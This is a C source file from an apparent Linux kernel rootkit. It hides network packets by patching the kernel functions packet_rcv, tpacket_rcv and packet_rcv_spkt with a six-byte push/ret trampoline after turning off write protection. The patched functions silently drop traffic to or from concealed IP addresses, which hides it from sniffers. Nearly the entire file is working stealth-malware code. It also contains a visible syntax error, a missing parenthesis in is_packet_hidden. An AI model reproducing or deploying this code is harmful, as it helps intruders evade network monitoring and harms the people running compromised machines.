/*
 * This file provides all the functionality needed for hiding packets.
 */
#include <net/ip.h>
#include <linux/inet.h>

#include "include.h"
#include "main.h"

int manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
int manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);
int manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);

/* the functions that are being hooked */
int (*packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv;
int (*packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_packet_rcv_spkt;
int (*tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void *) sysmap_tpacket_rcv;

/* spinlocks for each function we hook */
spinlock_t packet_rcv_lock;
unsigned long packet_rcv_flags;
spinlock_t tpacket_rcv_lock;
unsigned long tpacket_rcv_flags;
spinlock_t packet_rcv_spkt_lock;
unsigned long packet_rcv_spkt_flags;

/* the 'ret' hook we are using */
char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
unsigned int *target = (unsigned int *) (hook + 1);

/* code of the original functions that have been overwritten by us */
char original_packet_rcv[6];
char original_tpacket_rcv[6];
char original_packet_rcv_spkt[6];

/*
 * check if we need to hide this particular packet
 */
int
is_packet_hidden (struct sk_buff *skb)
{
	if (skb->protocol == htons(ETH_P_IP)) {
		struct iphdr* iphdr = (struct iphdr*) skb_network_header(skb);

		if (is_ip_hidden(iphdr->saddr)
				|| is_ip_hidden(iphdr->daddr) {
			
			return 1;
		}
	}
	
	return 0;
}

/* hooks 'packet_rcv' */
void
hook_packet_rcv (void)
{
	/* disable write protection */
	disable_page_protection();

	/* set the correct jump target */
	*target = (unsigned int *) manipulated_packet_rcv;

	/* backup and overwrite the first part of the function */
	memcpy(original_packet_rcv, packet_rcv, 6);
	memcpy(packet_rcv, hook, 6);
	
	/* reenable write protection */
	enable_page_protection();
}

/* hooks 'tpacket_rcv' */
void
hook_tpacket_rcv (void)
{
	/* disable write protection */
	disable_page_protection();

	/* set the correct jump target */
	*target = (unsigned int *) manipulated_tpacket_rcv;

	/* backup and overwrite the first part of the function */
	memcpy(original_tpacket_rcv, tpacket_rcv, 6);
	memcpy(tpacket_rcv, hook, 6);
	
	/* reenable write protection */
	enable_page_protection();
}

/* hooks 'packet_rcv_spkt' */
void
hook_packet_rcv_spkt (void)
{
	/* disable write protection */
	disable_page_protection();

	/* set the correct jump target */
	*target = (unsigned int *) manipulated_packet_rcv_spkt;

	/* backup and overwrite the first part of the function */
	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 6);
	memcpy(packet_rcv_spkt, hook, 6);
	
	/* reenable write protection */
	enable_page_protection();
}

/* restores 'packet_rcv' */
void
unhook_packet_rcv (void)
{
	/* disable write protection */
	disable_page_protection();

	/* restore the first 6 bytes we changed */
	memcpy(packet_rcv, original_packet_rcv, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* restores 'tpacket_rcv' */
void
unhook_tpacket_rcv (void)
{
	/* disable write protection */
	disable_page_protection();

	/* restore the first 6 bytes we changed */
	memcpy(tpacket_rcv, original_tpacket_rcv, 6);

	/* reenable write protection */
	enable_page_protection();
}

/* restores 'packet_rcv_spkt' */
void
unhook_packet_rcv_spkt (void)
{
	/* disable write protection */
	disable_page_protection();

	/* restore the first 6 bytes we changed */
	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 6); 

	/* reenable write protection */
	enable_page_protection();
}

/* our manipulated 'packet_rcv' */
int
manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
{
	int ret;
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);

	/* check if we need to hide this packet */	
	if(is_packet_hidden(skb)) {	
		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv'.\n");
		
		spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
		return 0; 
	}

	/* restore original, call it, hook again */
	unhook_packet_rcv();
	ret = packet_rcv(skb,dev,pt,orig_dev);
	hook_packet_rcv();
	
	/* return the correct value of the original function */
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
	return ret;	
}

/* our manipulated 'tpacket_rcv' */
int
manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
{
	int ret;
	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	
	/* check if we need to hide this packet */
	if(is_packet_hidden(skb)) {		
		ROOTKIT_DEBUG("Dropped a packet in 'tpacket_rcv'.\n");
		
		spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
		return 0; 
	}

	/* restore original, call it, hook again */
	unhook_tpacket_rcv();
	ret = tpacket_rcv(skb,dev,pt,orig_dev);
	hook_tpacket_rcv();
	
	/* return the correct value of the original function */
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
	return ret;	
}

/* our manipulated 'packet_rcv_spkt' */
int
manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
{
	int ret;
	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	
	/* check if we need to hide this packet */	
	if(is_packet_hidden(skb)) {	
		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv_spkt'.\n");
		
		spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
		return 0; 
	} 

	/* restore original, call it, hook again */
	unhook_packet_rcv_spkt();
	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
	hook_packet_rcv_spkt();

	/* return the correct value of the original function */
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	return ret;	
}

/* hooks all functions needed to hide packets */
int
load_packet_hiding (char *ipv4_addr)
{        
	ROOTKIT_DEBUG("Loading packet hiding...\n");

	/* do the initial hook of all three functions */
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	hook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	hook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
	
	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	hook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/* unhooks all functions */
void
unload_packet_hiding (void)
{
	ROOTKIT_DEBUG("Unloading packet hiding...\n");

	/* restore all three functions before unloading */
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	unhook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	unhook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
	
	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	unhook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	ROOTKIT_DEBUG("Done.\n");
}
